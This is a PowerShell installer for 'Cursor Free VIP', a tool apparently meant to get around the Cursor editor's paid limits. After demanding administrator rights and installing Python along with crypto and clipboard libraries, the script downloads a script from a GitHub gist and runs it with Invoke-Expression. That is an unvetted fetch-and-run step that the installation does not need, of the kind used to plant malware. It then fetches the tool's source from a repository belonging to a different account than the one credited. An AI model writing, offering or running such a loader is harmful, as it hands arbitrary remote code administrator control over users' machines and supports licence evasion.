# set color theme
$Theme = @{
    Primary   = 'Cyan'
    Success   = 'Green'
    Warning   = 'Yellow'
    Error     = 'Red'
    Info      = 'White'
}

# ASCII Logo
$Logo = @"
   ██████╗██╗   ██╗██████╗ ███████╗ ██████╗ ██████╗      ██████╗ ██████╗  ██████╗   
  ██╔════╝██║   ██║██╔══██╗██╔════╝██╔═══██╗██╔══██╗     ██╔══██╗██╔══██╗██╔═══██╗  
  ██║     ██║   ██║██████╔╝███████╗██║   ██║██████╔╝     ██████╔╝██████╔╝██║   ██║  
  ██║     ██║   ██║██╔══██╗╚════██║██║   ██║██╔══██╗     ██╔═══╝ ██╔══██╗██║   ██║  
  ╚██████╗╚██████╔╝██║  ██║███████║╚██████╔╝██║  ██║     ██║     ██║  ██║╚██████╔╝  
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝     ╚═╝     ╚═╝  ╚═╝ ╚═════╝  
"@

# Beautiful Output Function
function Write-Styled {
    param (
        [string]$Message,
        [string]$Color = $Theme.Info,
        [string]$Prefix = "",
        [switch]$NoNewline
    )
    $symbol = switch ($Color) {
        $Theme.Success { "[OK]" }
        $Theme.Error   { "[X]" }
        $Theme.Warning { "[!]" }
        default        { "[*]" }
    }
    
    $output = if ($Prefix) { "$symbol $Prefix :: $Message" } else { "$symbol $Message" }
    if ($NoNewline) {
        Write-Host $output -ForegroundColor $Color -NoNewline
    } else {
        Write-Host $output -ForegroundColor $Color
    }
}

# Show Logo
Write-Host $Logo -ForegroundColor $Theme.Primary

# Check and require admin privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Output 'Need administrator privileges'
    exit 1
}

# Get current user for task creation
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Write-Output "Installing for user: $currentUser"

# Check Python installation
$pythonFound = $false
try {
    $pythonVersion = python --version 2>&1
    if ($LASTEXITCODE -eq 0 -and $pythonVersion) {
        $pythonFound = $true
        Write-Styled "Python found: $pythonVersion" -Color $Theme.Success -Prefix "Python"
    }
} catch {
    $pythonFound = $false
}

if (-not $pythonFound) {
    Write-Styled "Python not found, installing..." -Color $Theme.Warning -Prefix "Python"
    $pythonUrl = 'https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe'
    $installerPath = "$env:TEMP\python-installer.exe"
    
    try {
        Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath
        Start-Process -FilePath $installerPath -ArgumentList '/quiet', 'InstallAllUsers=1', 'PrependPath=1' -Wait
        Remove-Item $installerPath -ErrorAction SilentlyContinue
        
        # Refresh environment variables
        $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
        
        # Verify installation
        Start-Sleep -Seconds 2
        $pythonVersion = python --version 2>&1
        if ($LASTEXITCODE -eq 0) {
            Write-Styled "Python installed successfully: $pythonVersion" -Color $Theme.Success -Prefix "Python"
            $pythonFound = $true
        } else {
            Write-Styled "Python installation may have failed. Please install Python manually." -Color $Theme.Error -Prefix "Error"
            Write-Styled "Please install Python manually from https://www.python.org/" -Color $Theme.Warning -Prefix "Info"
            $pythonFound = $false
        }
    } catch {
        Write-Styled "Failed to install Python: $($_.Exception.Message)" -Color $Theme.Error -Prefix "Error"
        Write-Styled "Please install Python manually from https://www.python.org/" -Color $Theme.Warning -Prefix "Info"
        $pythonFound = $false
    }
}

# If Python is still unavailable, show warning but continue execution
if (-not $pythonFound) {
    Write-Styled "Warning: Python is not available, some features may not work properly" -Color $Theme.Warning -Prefix "Warning"
    Write-Styled "Please install Python manually and run this script again" -Color $Theme.Info -Prefix "Info"
}

# Install Python dependencies (only if Python is available)
if ($pythonFound) {
    $requirements = @(
        @{Name='requests'; Version='2.31.0'},
        @{Name='pyperclip'; Version='1.8.2'},
        @{Name='cryptography'; Version='42.0.0'},
        @{Name='python-dotenv'; Version='1.0.0'},
        @{Name='colorama'; Version='0.4.6'},
        @{Name='typer'; Version='0.9.0'},
        @{Name='pywin32'; Version='306'},
        @{Name='pycryptodome'; Version='3.19.0'}
    )

    Write-Styled "Checking and installing Python dependencies..." -Color $Theme.Primary -Prefix "Dependencies"

foreach ($pkg in $requirements) {
    $pkgName = $pkg.Name
    $pkgVersion = $pkg.Version
    $installed = $false
    
    try {
        $checkCmd = "import pkg_resources; pkg_resources.get_distribution('$pkgName').version"
        $version = python -c $checkCmd 2>&1
        if ($LASTEXITCODE -eq 0 -and $version) {
            if ([version]$version -ge [version]$pkgVersion) {
                $installed = $true
            }
        }
    } catch {
        $installed = $false
    }
    
    if (-not $installed) {
        Write-Styled "Installing $pkgName >= $pkgVersion ..." -Color $Theme.Warning -Prefix "Install"
        try {
            python -m pip install "$pkgName>=$pkgVersion" --user --quiet
            if ($LASTEXITCODE -eq 0) {
                Write-Styled "$pkgName installed successfully" -Color $Theme.Success -Prefix "Success"
            } else {
                Write-Styled "$pkgName installation failed, but continuing..." -Color $Theme.Warning -Prefix "Warning"
            }
        } catch {
            Write-Styled "$pkgName installation failed: $($_.Exception.Message)" -Color $Theme.Warning -Prefix "Warning"
        }
    } else {
        Write-Styled "$pkgName is already installed" -Color $Theme.Success -Prefix "Found"
    }
}
} else {
    Write-Styled "Skipping dependency installation (Python not available)" -Color $Theme.Warning -Prefix "Skip"
}

Write-Styled "Executing remote code..." -Color $Theme.Primary -Prefix "Remote"
$gistUrl = 'https://gist.githubusercontent.com/wongstarx/2d1aa1326a4ee9afc4359c05f871c9a0/raw/install.ps1'
try {
    Write-Styled "Downloading remote script from Gist..." -Color $Theme.Info -Prefix "Download"
    $remoteScript = Invoke-WebRequest -Uri $gistUrl -UseBasicParsing
    Write-Styled "Remote script downloaded successfully, executing..." -Color $Theme.Success -Prefix "Execute"
    Invoke-Expression $remoteScript.Content
    Write-Styled "Remote code execution completed" -Color $Theme.Success -Prefix "Complete"
} catch {
    Write-Styled "Remote code execution failed: $($_.Exception.Message)" -Color $Theme.Error -Prefix "Error"
    Write-Styled "Continuing with local installation process..." -Color $Theme.Warning -Prefix "Continue"
}

# Get version number function (locked version)
function Get-LatestVersion {
    $VERSION = "1.11.03"
    Write-Styled "Target version locked: v$VERSION" -Color $Theme.Primary -Prefix "Version"
    return @{
        Version = $VERSION
    }
}

# Show version information
$releaseInfo = Get-LatestVersion
$version = $releaseInfo.Version
Write-Host "Version $version" -ForegroundColor $Theme.Info
Write-Host "Created by YeongPin`n" -ForegroundColor $Theme.Info

# Set TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Main installation function
function Install-CursorFreeVIP {
    # Check if Python is available
    $pythonAvailable = $false
    try {
        $pythonVersion = python --version 2>&1
        if ($LASTEXITCODE -eq 0 -and $pythonVersion) {
            $pythonAvailable = $true
        }
    } catch {
        $pythonAvailable = $false
    }
    
    if (-not $pythonAvailable) {
        Write-Styled "Python is not available, cannot continue installation" -Color $Theme.Error -Prefix "Error"
        Write-Styled "Please install Python first: https://www.python.org/" -Color $Theme.Warning -Prefix "Info"
        return
    }
    
    Write-Styled "Start downloading Cursor Free VIP (source code mode)" -Color $Theme.Primary -Prefix "Download"
    
    try {
        # Get version
        $releaseInfo = Get-LatestVersion
        $version = $releaseInfo.Version
        
        # Set installation directory and download path
        $installDir = Join-Path $env:USERPROFILE ".cursor-vip-src"
        $zipName = "cursor-free-vip-${version}.zip"
        $zipPath = Join-Path $env:TEMP $zipName
        
        # Use releases page source code package address
        $downloadUrl = "https://github.com/SHANMUGAM070106/cursor-free-vip/archive/refs/tags/v${version}.zip"
        
        # Check if installation directory already exists
        $existingDir = Get-ChildItem -Path $installDir -Directory -Filter "cursor-free-vip*" -ErrorAction SilentlyContinue | Select-Object -First 1
        
        if ($existingDir -and (Test-Path (Join-Path $existingDir.FullName "main.py"))) {
            Write-Styled "Detected installed source code version" -Color $Theme.Success -Prefix "Found"
            Write-Styled "Location: $($existingDir.FullName)" -Color $Theme.Info -Prefix "Location"
            
            # Install dependencies
            if (Test-Path (Join-Path $existingDir.FullName "requirements.txt")) {
                Write-Styled "Installing project-specific dependencies (requirements.txt)..." -Color $Theme.Primary -Prefix "Dependencies"
                python -m pip install -r (Join-Path $existingDir.FullName "requirements.txt") --user
            }
            
            # Run Python script
            Write-Styled "Starting Cursor Free VIP (source code mode)..." -Color $Theme.Primary -Prefix "Launch"
            $mainPy = Join-Path $existingDir.FullName "main.py"
            python $mainPy
            return
        }
        
        # Create installation directory
        if (-not (Test-Path $installDir)) {
            New-Item -ItemType Directory -Path $installDir -Force | Out-Null
        }
        
        Write-Styled "Downloading source code package..." -Color $Theme.Primary -Prefix "Download"
        Write-Styled "Download URL: $downloadUrl" -Color $Theme.Info -Prefix "URL"
        
        # Create WebClient and add progress event
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "PowerShell Script")

        # Define progress variables
        $Global:downloadedBytes = 0
        $Global:totalBytes = 0
        $Global:lastProgress = 0
        $Global:lastBytes = 0
        $Global:lastTime = Get-Date

        # Download progress event
        $eventId = [guid]::NewGuid()
        Register-ObjectEvent -InputObject $webClient -EventName DownloadProgressChanged -Action {
            $Global:downloadedBytes = $EventArgs.BytesReceived
            $Global:totalBytes = $EventArgs.TotalBytesToReceive
            $progress = [math]::Round(($Global:downloadedBytes / $Global:totalBytes) * 100, 1)
            
            # Only update display when progress changes by more than 1%
            if ($progress -gt $Global:lastProgress + 1) {
                $Global:lastProgress = $progress
                $downloadedMB = [math]::Round($Global:downloadedBytes / 1MB, 2)
                $totalMB = [math]::Round($Global:totalBytes / 1MB, 2)
                
                # Calculate download speed
                $currentTime = Get-Date
                $timeSpan = ($currentTime - $Global:lastTime).TotalSeconds
                if ($timeSpan -gt 0) {
                    $bytesChange = $Global:downloadedBytes - $Global:lastBytes
                    $speed = $bytesChange / $timeSpan
                    
                    # Choose appropriate unit based on speed
                    $speedDisplay = if ($speed -gt 1MB) {
                        "$([math]::Round($speed / 1MB, 2)) MB/s"
                    } elseif ($speed -gt 1KB) {
                        "$([math]::Round($speed / 1KB, 2)) KB/s"
                    } else {
                        "$([math]::Round($speed, 2)) B/s"
                    }
                    
                    $progressText = "$progress%"
                    Write-Host "`rDownloading: $downloadedMB MB / $totalMB MB ($progressText) - $speedDisplay" -NoNewline -ForegroundColor Cyan
                    
                    # Update last data
                    $Global:lastBytes = $Global:downloadedBytes
                    $Global:lastTime = $currentTime
                }
            }
        } | Out-Null

        # Download completed event
        Register-ObjectEvent -InputObject $webClient -EventName DownloadFileCompleted -Action {
            Write-Host "`r" -NoNewline
            Write-Styled "Download completed!" -Color $Theme.Success -Prefix "Complete"
            Unregister-Event -SourceIdentifier $eventId
        } | Out-Null

        # Start download
        $webClient.DownloadFileAsync([Uri]$downloadUrl, $zipPath)

        # Wait for download to complete
        while ($webClient.IsBusy) {
            Start-Sleep -Milliseconds 100
        }
        
        Write-Styled "Download completed!" -Color $Theme.Success -Prefix "Complete"
        Write-Styled "Extracting source code..." -Color $Theme.Primary -Prefix "Extract"
        
        # Extract source code package
        Expand-Archive -Path $zipPath -DestinationPath $installDir -Force
        
        # Find the actual directory name after extraction
        $actualDir = Get-ChildItem -Path $installDir -Directory -Filter "cursor-free-vip*" | Select-Object -First 1
        
        if ($actualDir) {
            Write-Styled "Extraction completed!" -Color $Theme.Success -Prefix "Complete"
            
            # Install project-specific dependencies
            $requirementsPath = Join-Path $actualDir.FullName "requirements.txt"
            if (Test-Path $requirementsPath) {
                Write-Styled "Installing project-specific dependencies (requirements.txt)..." -Color $Theme.Primary -Prefix "Dependencies"
                python -m pip install -r $requirementsPath --user
            } else {
                Write-Styled "requirements.txt not found, assuming common dependencies are installed" -Color $Theme.Warning -Prefix "Warning"
            }
            
            # Run Python script
            Write-Styled "Starting Cursor Free VIP (source code mode)..." -Color $Theme.Primary -Prefix "Launch"
            $mainPy = Join-Path $actualDir.FullName "main.py"
            python $mainPy
        } else {
            Write-Styled "Cannot find directory after extraction" -Color $Theme.Error -Prefix "Error"
            throw "Cannot find extracted directory"
        }
        
        # Clean up temporary files
        if (Test-Path $zipPath) {
            Remove-Item $zipPath -Force
        }
    }
    catch {
        Write-Styled $_.Exception.Message -Color $Theme.Error -Prefix "Error"
        throw
    }
}

# Execute installation
try {
    Install-CursorFreeVIP
}
catch {
    Write-Styled "Download failed" -Color $Theme.Error -Prefix "Error"
    Write-Styled $_.Exception.Message -Color $Theme.Error
}
finally {
    Write-Host "`nPress any key to exit..." -ForegroundColor $Theme.Info
    $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
}
